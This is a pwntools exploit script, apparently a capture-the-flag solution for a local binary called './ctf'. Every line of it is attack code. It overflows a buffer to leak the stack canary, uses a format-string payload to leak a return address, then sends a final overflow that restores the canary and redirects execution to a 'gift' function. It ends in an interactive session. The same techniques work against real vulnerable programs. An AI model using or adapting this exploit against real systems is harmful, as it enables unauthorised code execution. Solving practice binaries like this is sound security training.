from pwn import *

gift_offset = 0x14a

p = process("./ctf")

canary_pay = b""
canary_pay += b"A" * 33

p.sendafter(">> ",canary_pay)
p.recvuntil(">>")
p.recvuntil("A" * 32)

leak = p.recv(4)[1:]
canary = u32(b"\x00" + leak)

print(hex(canary))
input()
p.recvuntil(">> ")

pay = b""
pay += b"%lx-" * 11
p.send(pay)

p.recvuntil("-2d786c25" * 5)
p.recv(5)
ret_leak = u32(p.recv(4))
gift = ret_leak - gift_offset

print(hex(gift))

pay2 = b""
pay2 += b"A"*32
pay2 += p32(canary)
pay2 += b"B"*12
pay2 += p32(gift)

p.send(pay2)

p.interactive()